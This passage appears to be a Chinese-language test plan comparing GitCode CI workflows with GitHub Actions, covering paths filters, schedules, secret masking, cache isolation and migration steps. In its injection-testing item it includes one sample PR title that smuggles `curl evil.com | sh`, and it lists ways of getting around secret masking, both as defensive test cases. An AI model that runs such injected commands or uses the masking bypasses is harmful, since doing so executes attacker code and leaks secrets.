风险点:     GitCode 声明 `paths` 过滤器「匹配前 300 个变更文件」，超出不参与判断——这是与 GitHub 的关键行为差异。GitHub 的 paths 过滤限制是「diff 包含 > 3000 文件时不运行」和「>1000 commits 始终运行」。两者阈值数量级不同且语义不同（GitCode 是截断，GitHub 是跳过）。另外需验证 GitCode 的 `!` 排除语法（`'!main'`）和 glob 通配语义（`**`/`*`/`?`）是否与 GitHub 一致。已有用例 TC-236 发现满足 paths 条件的 PR 变更没有对应 workflow 运行——疑似 bug。
预期系统行为: (1) 变更文件 <=300 个时 paths/! 过滤行为与 GitHub glob 语义一致；(2) 变更文件 >300 个时，前 300 个文件参与匹配，第 301+ 个被截断不参与（GitCode 声明行为）；(3) 排除语法 `!pattern` 行为正确。
Oracle 来源: 差异确认 — GitCode 声明了 300 文件上限（有意与 GitHub 的 3000 不同）

验证要点:
  - [正向] `paths: ['src/**']` 仅 src/ 下文件变更时触发
  - [正向] `paths-ignore: ['docs/**']` docs/ 变更不触发
  - [正向] `branches: ['**', '!main']` 排除 main 分支
  - [正向] 变更文件 >300 时，第 301+ 个文件不参与匹配——但前 300 个行为正常
  - [负向] 不应出现：paths 条件满足但不触发（已有 TC-236 的 FAIL 作为追踪）

对齐方向:   差异确认 — paths 上限有意不同
优先级线索: RISK-COMPAT-01
来源输入:   gitcode-spec/syntax-reference/trigger-events.md; github-reference/reference/workflow-syntax.md; COMPAT-NOTES.md §5; 已有用例 TC-236
破坏级别:   none
```

---

## 十四、schedule 定时触发差异

### INTENT-COMPAT-020

```
意图 ID:    INTENT-COMPAT-020
维度标签:   [compatibility]
标题:       schedule 定时触发差异：时区支持、默认分支限制、最短间隔、长期不活跃策略

风险点:     GitCode schedule 仅 UTC（不支持 GitHub 的 `timezone` 字段）。GitHub 支持 IANA 时区。GitCode 声明最短间隔 5 分钟、仅默认分支生效——与 GitHub 的 5 分钟最短间隔和仅默认分支一致。但 GitHub 有「public repo 60 天无活动自动暂停 schedule」的节能策略——GitCode 是否有等价机制？另外已有用例 S3 × 24 + TC-391 发现 scheduler 完全不可用：两个仓库、多次 cron 配置从未产生 schedule run——这是 P1 已知 bug。
预期系统行为: (1) schedule cron 在 UTC 时区按表达式触发；(2) 仅默认分支上的 workflow 文件被 schedule 触发；(3) 最短间隔 5 分钟；(4) 使用 `timezone` 字段（GitHub 语法）应有明确行为（报错/忽略/不触发）。
Oracle 来源: 差异确认 — GitCode 仅 UTC；基本语义应与 GitHub 对齐

验证要点:
  - [正向] cron 在 UTC 时区按时触发
  - [正向] 非默认分支的 workflow schedule 不触发
  - [负向] `timezone: "America/New_York"`（GitHub 字段）应有明确行为
  - [负向] schedule 应可实际触发（已有 S3×24+TC-391 的 FAIL 为 blocker）

对齐方向:   差异确认（时区）+ 一致性（其余语义）
优先级线索: RISK-COMPAT-01
来源输入:   gitcode-spec/syntax-reference/trigger-events.md; github-reference/reference/events.md; COMPAT-NOTES.md §5; 已有用例 S3×24+TC-391
破坏级别:   none
```

---

## 十五、workflow_call 嵌套深度限制

### INTENT-COMPAT-021

```
意图 ID:    INTENT-COMPAT-021
维度标签:   [compatibility]
标题:       workflow_call 嵌套深度限制：最多 2 层（不能再套一层）

风险点:     GitCode 声明 `workflow_call` 最多嵌套 2 层。GitHub 对可复用 workflow 的嵌套深度限制不同（文档未明确硬限制但实践中也有调用深度约束）。关键风险：(1) 第 3 层调用是报错还是静默不执行；(2) 递归/循环调用（A call B call A）的检测和防护。
预期系统行为: (1) 第 1-2 层 workflow_call 正常执行；(2) 第 3 层应报错（非静默忽略）；(3) 循环调用应被检测并阻止。
Oracle 来源: 差异确认 — GitCode 声明了 2 层硬限制

验证要点:
  - [正向] workflow A → call B → call C（2 层嵌套）正常执行
  - [负向] workflow A → call B → call C → call D（3 层嵌套）应有明确报错
  - [负向] A call B 且 B call A（循环）应被检测并报错

对齐方向:   差异确认 — GitCode 声明了硬限制
优先级线索: RISK-COMPAT-01
来源输入:   gitcode-spec/writing-pipelines/configure-triggers.md; COMPAT-NOTES.md §5
破坏级别:   none
```

---

## 十六、不支持能力的降级行为

### INTENT-COMPAT-022

```
意图 ID:    INTENT-COMPAT-022
维度标签:   [compatibility]
标题:       不支持特征的降级行为分类：jobs.<job_id>.container / environment 字段 / runs.using 非 node16

风险点:     已有用例 TC-010 发现 `environment` 字段不被平台识别（语法检查报 unknown property）；TC-273 发现 `container.image` 不可用。关键问题是：GitCode 对不支持的特征是统一报错、静默忽略、还是部分支持？每种降级方式的风险不同：(1) 报错 = 安全但摩擦大；(2) 静默忽略 = 零摩擦但极度危险（以为有环境保护实际没有）；(3) 部分支持 = 边界最模糊。需要系统性分类每个不支持能力的降级方式。
预期系统行为: 对明确不支持的能力，GitCode 应报错而非静默忽略。特别是安全相关的不支持（如 environment 保护），静默忽略等于安全真空。
Oracle 来源: GitCode 规格（部分已在文档中声明不支持）+ GitHub 行为（一致性——若未声明差异，不支持应报错）

验证要点:
  - [正向] 不支持的字段：`environment` → 报错（已验证 TC-010 报 unknown property——正确行为）
  - [正向] 不支持的字段：`container.image` → 报错（非静默忽略）
  - [正向] 不支持的字段：`runs.using: node20`/`docker`/`composite` → 报错
  - [正向] 不支持的字段：`jobs.<job_id>.services` → 报错
  - [负向] 任何不支持的特征不应静默忽略（尤其是安全相关）

对齐方向:   一致性 — 对 GitCode 不支持但未声明的 GitHub 特征，应报错而非静默降级
优先级线索: RISK-COMPAT-01 + RISK-USE-01
来源输入:   COMPAT-NOTES.md §10; 已有用例 TC-010/TC-273
破坏级别:   none
```

---

## 十七、GitCode 独有事件类型

### INTENT-COMPAT-023

```
意图 ID:    INTENT-COMPAT-023
维度标签:   [compatibility]
标题:       pull_request_comment 事件：GitCode 独有触发事件类型的语义验证

风险点:     GitCode 有 `pull_request_comment` 事件（带 `comments` 正则过滤），GitHub 没有。这是 GitCode 额外能力——但需验证其实现完整性：payload 结构是否完整、过滤是否正确、与 `issue_comment` 的 PR 评论是否冲突/重复触发。
预期系统行为: (1) `pull_request_comment` 仅在 PR 评论时触发，不在 Issue 评论时触发；(2) `comments` 正则过滤正确匹配评论内容；(3) payload 中的 `atomgit.event.*` 字段完整且正确。
Oracle 来源: GitCode 规格 — 独有事件，语义由 GitCode 文档定义

验证要点:
  - [正向] PR 评论时触发 pull_request_comment，payload 中含 PR 信息
  - [正向] Issue 评论时应触发 issue_comment 但不触发 pull_request_comment
  - [正向] `comments` 正则过滤正确匹配/排除不同内容的评论
  - [负向] 同一评论不应同时触发 pull_request_comment 和 issue_comment

对齐方向:   差异确认 — GitCode 独有事件，无 GitHub 对等物
优先级线索: RISK-COMPAT-01
来源输入:   gitcode-spec/syntax-reference/trigger-events.md; COMPAT-NOTES.md §5
破坏级别:   none
```

---

## 十八、workflow 命令与注解

### INTENT-COMPAT-024

```
意图 ID:    INTENT-COMPAT-024
维度标签:   [compatibility, usability]
标题:       workflow 命令（::group:: / ::error:: / ::warning:: / ::debug:: / ::add-mask::）的对标可用性

风险点:     GitCode 文档记录了环境文件协议（`ATOMGIT_OUTPUT`/`ATOMGIT_ENV`/`ATOMGIT_PATH`/`ATOMGIT_STEP_SUMMARY`）但未明确说明 `::group::`/`::endgroup::`/`::error::`/`::warning::`/`::debug::`/`::notice::`/`::add-mask::` 等 stdout 工作流命令是否支持。GitHub 这些命令是 runner-stdout 协议的核心部分，广泛用于三方 action 的日志分组和注解输出。
预期系统行为: (1) `::group::title` / `::endgroup::` 正确折叠日志；(2) `::error::` / `::warning::` 创建注解落到 PR/commit；(3) `::add-mask::` 脱敏；(4) `::debug::` 在开启 debug logging 后可见。
Oracle 来源: GitHub 行为（一致性 — GitCode 文档未声明差异，预期支持这些标准 workflow 命令）

验证要点:
  - [正向] `::group::Build` ... `::endgroup::` 日志正确折叠
  - [正向] `::error file=app.js,line=1::Missing semicolon` 创建注解
  - [正向] `::warning::Deprecated API` 创建 warning 注解
  - [正向] `::add-mask::$SECRET` 正确脱敏后续日志
  - [正向] `::debug::verbose info` 在 ACTIONS_STEP_DEBUG=true 时可见

对齐方向:   一致性（GitCode 未声明差异，workflow 命令应可用）
优先级线索: RISK-USE-01
来源输入:   gitcode-spec/syntax-reference/workflow-commands.md; github-reference/reference/workflow-commands.md; COMPAT-NOTES.md §11
破坏级别:   none
```

---

## 十九、context 上下文可用性矩阵

### INTENT-COMPAT-025

```
意图 ID:    INTENT-COMPAT-025
维度标签:   [compatibility]
标题:       上下文可用性矩阵：验证 atomgit/env/secrets/runner/matrix/strategy 在各作用域的可用性

风险点:     GitHub 有详细的上下文可用性矩阵（某些上下文仅在特定作用域可用，如 `job` 上下文在 workflow 级别不可用）。GitCode 文档列出了 11 个上下文但未提供可用性矩阵。关键风险：(1) `runner` 上下文在 `if` 条件中可能不可用（GitHub 文档显示 runner 在 if 中不可用）；(2) `secrets` 上下文在 `if` 条件中可用性限制（GitHub: secrets 不可在 if 中直接使用）；(3) 已有用例 TC-135/TC-136 等覆盖了部分可用性验证，但需要跨作用域系统验证。
预期系统行为: 每个上下文的可用性应与 GitHub 上下文可用性矩阵对齐，或 GitCode 明确文档化差异。
Oracle 来源: GitHub 行为（一致性 — GitCode 未提供可用性矩阵，默认应与 GitHub 对齐）

验证要点:
  - [正向] `env` 上下文在 workflow/job/step/if 各级别可用
  - [正向] `secrets` 上下文在 run: 中可用，在 if: 中不可用（与 GitHub 一致）
  - [正向] `runner` 上下文在 job/step 可用，在 workflow 级别不可用
  - [正向] `job` 上下文仅在 job/step 级别可用
  - [负向] 不应出现：在 GitHub 不可用的上下文在 GitCode 中可访问（超出预期）

对齐方向:   一致性
优先级线索: RISK-COMPAT-01
来源输入:   gitcode-spec/syntax-reference/context.md; github-reference/reference/contexts.md; 已有用例 TC-105 到 TC-192 覆盖了部分可用性
破坏级别:   none
```

---

## 二十、表达式注入与不可信输入处理（兼安全维度）

### INTENT-COMPAT-026

```
意图 ID:    INTENT-COMPAT-026
维度标签:   [compatibility, security]
标题:       不可信输入注入防护对标：PR 标题/分支名/commit message 在表达式中的处理

风险点:     GitHub Actions 最常见的漏洞类：将不可信输入（PR 标题、分支名、commit message、issue 评论）通过 `${{ }}` 嵌入 `run:` 脚本导致命令注入。GitHub 的安全文档详细列出了注入模式和缓解措施。GitCode 的表达式引擎如果类型转换/字符串处理与 GitHub 不同，可能产生不同的注入面。需要验证 GitCode 是否在表达式求值层面对不可信输入有额外防护或限制。
预期系统行为: (1) 通过 `${{ }}` 嵌入的不可信输入在 `run:` 脚本中的行为与 GitHub 一致（即都允许执行）；(2) GitCode 不应放宽 GitHub 已有的限制（如 secrets 不可在 if 中使用）；(3) 若有额外防护机制应文档化。
Oracle 来源: GitHub 行为（一致性 — 注入面应与 GitHub 对齐，不应因 GitCode 的实现差异而增加新攻击面）

验证要点:
  - [正向] `run: echo "${{ github.event.pull_request.title }}"` 正常工作
  - [负向] PR 标题中包含 `"; curl evil.com | sh` 不应被执行（因为 GitHub 也是嵌入 echo 参数中）
  - [负向] secrets 在 `if:` 条件中应不可用（或脱敏/报错）
  - [负向] 不可信输入不应能注入 `::` workflow 命令

对齐方向:   一致性 — 安全防护不应弱于 GitHub
优先级线索: RISK-SEC-02（不可信输入注入命令执行）
来源输入:   github-reference/security/script-injections.md; github-reference/security/secure-use.md; COMPAT-NOTES.md §8
破坏级别:   none
```

---

## 二十一、跨维度覆盖：迁移路径完整摩擦

### INTENT-COMPAT-027

```
意图 ID:    INTENT-COMPAT-027
维度标签:   [compatibility, usability]
标题:       端到端迁移摩擦清单：从 .github/workflows 到 .gitcode/workflows 的最小改写路线

风险点:     综合前述所有差异，一个标准 GitHub workflow 搬到 GitCode 至少需要改写：(1) 目录 `.github/workflows/` → `.gitcode/workflows/`；(2) `runs-on: ubuntu-latest` → `runs-on: {ubuntu-24,x64,small}`；(3) `github.*` 上下文 → `atomgit.*`；(4) `$GITHUB_*` 变量 → `$ATOMGIT_*`；(5) `success()`/`failure()` → `success`/`failed`；(6) `actions/checkout@v4` → `checkout`；(7) `permissions:` 块重写；(8) `types: [opened, synchronize, reopened]` → `types: [open, update, reopen]`；(9) 非 string 类型 inputs 改写；(10) `concurrency` 块重写。这些改写点是否有集中的迁移文档？逐一改写时错误信息是否指明原因？
预期系统行为: 每个迁移摩擦点都有对应的错误信息指向正确的 GitCode 写法——而非泛化报错。
Oracle 来源: 差异确认 — 每个摩擦点已在其他 intent 中独立覆盖，本条 intent 关注端到端串联 + 文档可用性

验证要点:
  - [正向] 搬运标准 GitHub workflow 并按迁移清单逐项修改后，workflow 可正常触发和执行
  - [正向] 每个未修改的差异点在触发时产生可理解的错误信息（非 500/内部错误）
  - [非功能] 迁移文档是否覆盖上述全部 10 个改写点？缺失哪些？（易用性，可 llm_assisted）

对齐方向:   差异确认
优先级线索: RISK-USE-01
来源输入:   COMPAT-NOTES.md 全文; gitcode-spec/00-overview.md; gitcode-spec/01-quick-start.md
破坏级别:   none
可理解性判据: <是 — 迁移文档的完整性可由文本审查判断，但报错质量需实测>
```

---

## 二十二、Secret 日志脱敏对标

### INTENT-COMPAT-028

```
意图 ID:    INTENT-COMPAT-028
维度标签:   [compatibility, security]
标题:       secrets 日志脱敏行为对标：`***` 遮蔽的覆盖范围与绕过变形验证

风险点:     GitCode 文档声明 secrets 在日志中被 `***` 遮蔽，但自承 `echo "${{ secrets.X }}"` 可能绕过脱敏。GitHub 有完善的脱敏机制（包含 base64/拼接/多行变形检测）。关键验证点：(1) 直接 echo、间接赋值后 echo、base64 编码后 echo、大小写变体——GitCode 的脱敏覆盖哪些？(2) 已有用例 TC-011 覆盖了基本脱敏（PASS），但需要验证更多绕过变形。
预期系统行为: (1) `echo ${{ secrets.TOKEN }}` 在日志中显示 `***`；(2) `echo $TOKEN`（通过 env 间接赋值）也显示 `***`；(3) base64 编码后的 secret 应被检测并脱敏；(4) 若 GitCode 文档自承可能的绕过，应明确列出绕过场景。
Oracle 来源: GitHub 行为（一致性 — secrets 脱敏强度不应弱于 GitHub）

验证要点:
  - [正向] 直接 echo secrets 值 → `***`
  - [正向] 通过 env 变量间接 echo → `***`
  - [负向] `echo "$TOKEN" | base64` 不应泄密（GitHub 会脱敏 base64 编码的 secret）
  - [负向] 大小写变体/拼接/多行不应绕过脱敏

对齐方向:   一致性 — 脱敏强度不应弱于 GitHub
优先级线索: RISK-SEC-01
来源输入:   gitcode-spec/security-permissions/using-secrets.md; github-reference/security/secrets.md; COMPAT-NOTES.md §8; 已有用例 TC-011
破坏级别:   none
```

---

## 二十三、矩阵构建 fail-fast 语义差异

### INTENT-COMPAT-029

```
意图 ID:    INTENT-COMPAT-029
维度标签:   [compatibility]
标题:       matrix fail-fast 双层语义：strategy.fail-fast vs stages.fail_fast 的混淆风险

风险点:     GitCode 存在两种 fail_fast：(1) `strategy.fail-fast`（矩阵级——GitHub 也有）；(2) `stages.fail_fast`（阶段级——GitCode 独有）。COMPAT-NOTES.md 明确警告两者语义不同但容易混淆。GitHub 仅 `strategy.fail-fast`（默认 true），GitCode 的 `stages.fail_fast` 没有 GitHub 对等物。
预期系统行为: (1) `strategy.fail-fast: true` → 矩阵内任一 job 失败时取消其余正在运行的矩阵 job；(2) `stages.fail_fast: true` → 当前阶段任一 job 失败时跳过所有后续阶段；(3) 两者同时设置时行为可预测且文档化。
Oracle 来源: 差异确认 — stages.fail_fast 是 GitCode 独有；strategy.fail-fast 应与 GitHub 对齐

验证要点:
  - [正向] strategy.fail-fast: true 下矩阵中 1/3 失败 → 其余 2 被取消
  - [正向] strategy.fail-fast: false 下矩阵中 1/3 失败 → 其余 2 继续
  - [正向] stages.fail_fast: true 下阶段内 job 失败 → 后续阶段跳过
  - [正向] 两者同时为 true → 行为应可预测

对齐方向:   差异确认（stages.fail_fast）+ 一致性（strategy.fail-fast）
优先级线索: RISK-COMPAT-01
来源输入:   gitcode-spec/writing-pipelines/configure-matrix-builds.md; gitcode-spec/writing-pipelines/workflow-file-location-structure.md; COMPAT-NOTES.md §4
破坏级别:   none
```

---

## 二十四、outputs/job 间数据传递协议

### INTENT-COMPAT-030

```
意图 ID:    INTENT-COMPAT-030
维度标签:   [compatibility]
标题:       job outputs 传递：ATOMGIT_OUTPUT 协议 + steps.<id>.outputs + jobs.<id>.outputs 对标

风险点:     GitCode 使用 `ATOMGIT_OUTPUT` 文件协议（与 GitHub `GITHUB_OUTPUT` 语义一致）。但已有用例 TC-486/481/499 发现 `needs:` 指向 matrix 父 job 导致"任务初始化错误"。这暗示 job outputs 在 matrix 场景下可能有问题。另外需要验证：(1) `steps.<id>.outputs` 与 `jobs.<id>.outputs` 的数据传递完整性；(2) outputs 的类型（string only？）；(3) 多行 outputs 的正确传递。
预期系统行为: (1) `echo "key=value" >> $ATOMGIT_OUTPUT` 使 `steps.<id>.outputs.key` 可访问；(2) `jobs.<id>.outputs` 正确映射到 job 内某 step 的输出；(3) 下游 job 通过 `needs.<id>.outputs.<key>` 正确读取。
Oracle 来源: GitHub 行为（一致性 — outputs 协议语义应与 GitHub 对齐）

验证要点:
  - [正向] step 通过 ATOMGIT_OUTPUT 设置的输出可被同 job 后续 step 读取
  - [正向] job.outputs 声明的输出可被下游 needs job 读取
  - [正向] matrix job 的 outputs 可被 needs 引用（已有 TC-486 发现此场景有 bug）
  - [正向] 多行 outputs 通过 heredoc 正确传递

对齐方向:   一致性
优先级线索: RISK-COMPAT-01
来源输入:   gitcode-spec/syntax-reference/workflow-commands.md; gitcode-spec/writing-pipelines/pass-output-between-jobs.md; 已有用例 TC-486/481/499
破坏级别:   none
```

---

## 二十五：artifact 与 cache 边界行为

### INTENT-COMPAT-031

```
意图 ID:    INTENT-COMPAT-031
维度标签:   [compatibility]
标题:       内置 upload-artifact/download-artifact 等价性 + cache 作用域隔离

风险点:     GitCode 提供 `upload-artifact`/`download-artifact`/`cache` 内置 action。(1) artifact 跨 job 传递、保留期是否与 GitHub 行为一致？(2) cache key 作用域隔离：fork PR 能否写缓存污染主分支缓存（GitHub 有 cache 投毒防护——fork PR 的 cache 与主分支隔离）。GitCode 是否有等价防护？(3) 大 artifact/大 cache 的边界与配额行为。
预期系统行为: (1) artifact 正确跨 job 传递；(2) cache 的 key 匹配、命中、回退行为与 GitHub `actions/cache` 一致；(3) fork PR 的 cache 应与主分支隔离（安全）；
Oracle 来源: GitHub 行为（一致性）+ GitCode 规格

验证要点:
  - [正向] upload-artifact → download-artifact 跨 job 正确传递
  - [正向] cache 命中/未命中/回退行为正确
  - [负向] fork PR 写缓存不应污染主分支缓存
  - [负向] 不应出现：artifact 保留期到期后仍可下载（数据泄露）

对齐方向:   一致性（artifact/cache 语义应与 GitHub 对齐）
优先级线索: RISK-COMPAT-01 + RISK-SEC-01（cache 投毒）
来源输入:   gitcode-spec/core-concepts/artifacts-and-cache.md; gitcode-spec/writing-pipelines/upload-download-artifacts.md; COMPAT-NOTES.md §10
破坏级别:   none
```

---

## 覆盖度自检表

| §10 差异类别 | 覆盖 Intent |
|---|---|
| 默认值差异 (shell/permissions/concurrency) | INTENT-COMPAT-014, INTENT-COMPAT-015 |
| 表达式函数差异 (括号/函数集/大小写/类型强转) | INTENT-COMPAT-003, 004, 005, 006 |
| 触发过滤语义差异 (types命名/paths上限/schedule) | INTENT-COMPAT-007, 008, 019, 020 |
| 上下文对象差异 (atomgit属性/可用性/runner格式) | INTENT-COMPAT-001, 011, 025 |
| 不支持能力的降级方式 | INTENT-COMPAT-022 |
| 内置 action 差异 (引用格式/等价行为/artifact-cache) | INTENT-COMPAT-012, 031 |
| runner 标签/环境差异 | INTENT-COMPAT-010, 011 |
| 编排模型差异 (stages/post/concurrency) | INTENT-COMPAT-015, 017, 018, 029 |
| 权限模型差异 (permissions命名/隔离/脱敏) | INTENT-COMPAT-009, 028 |
| 迁移摩擦 (目录/inputs/端到端) | INTENT-COMPAT-013, 016, 027 |
| 安全对标 (pr_target/fork隔离/注入) | INTENT-COMPAT-008, 026, 028 |
| 工作流命令 (group/error/warning/debug) | INTENT-COMPAT-024 |
| 数据传递 (outputs协议) | INTENT-COMPAT-030 |
| 独有机制 (pull_request_comment) | INTENT-COMPAT-023 |

**共计 31 条 compat-diff intents。**

## 交叉引用已有的 FAIL 用例

以下兼容性缺陷已在 `existing-cases/cases.md` 中有 FAIL 记录，不在本次出独立 intent，但作为验证线索引用：

| 已有用例 | FAIL 描述 | 引用 intent |
|---|---|---|
| TC-064 | PR state 返回 `opened`（GitHub 命名） | → INTENT-COMPAT-007 (types 命名差异) |
| TC-094/TC-137 | runner.os 返回 `linux` 非 `Linux` | → INTENT-COMPAT-011 (runner 上下文字段格式) |
| TC-095 | runner.arch 返回 `x86_64` 非 `X64` | → INTENT-COMPAT-011 |
| TC-206 | ATOMGIT_REPOSITORY_OWNER 未注入 Runner | → INTENT-COMPAT-002 (系统环境变量) |
| TC-220 | ATOMGIT_ACTIONS_ALLOW_UNSECURE_COMMANDS 默认值缺失 | → INTENT-COMPAT-002 |
| TC-234 | PR update 类型未触发 workflow | → INTENT-COMPAT-007 |
| TC-236 | paths 过滤条件不生效 | → INTENT-COMPAT-019 |
| TC-273 | container.image 不可用 | → INTENT-COMPAT-022 |
| TC-310 | setup-java 不存在 | → INTENT-COMPAT-012 |
| TC-461/TC-463 | pull_request_target 不触发 | → INTENT-COMPAT-008 |
| TC-486/481/499 | needs 指向 matrix job 初始化错误 | → INTENT-COMPAT-030 |
| TC-533 | Job env 不注入 Shell | → INTENT-COMPAT-002 |
| TC-561 | PR merge 不触发 pull_request 独立 Job | → INTENT-COMPAT-007 |
| S3×24+TC-391 | schedule 完全不工作 | → INTENT-COMPAT-020 |

## 输入缺失声明

`workflow-samples/` 目录缺失。以下 intent 的「现实常用性」评估基于 GitCode/GitHub 文档示例 + COMPAT-NOTES 线索推断，可能高估或遗漏实际高频模式：
- INTENT-COMPAT-005 (startsWith/endsWith 大小写)：未确认依赖大小写不敏感的 workflow 在真实开源项目中的出现频率
- INTENT-COMPAT-023 (pull_request_comment)：未确认此独有事件在实际迁移中的使用率
- INTENT-COMPAT-027 (端到端迁移)：未对照真实 GitHub workflow 验证改写清单的完整性
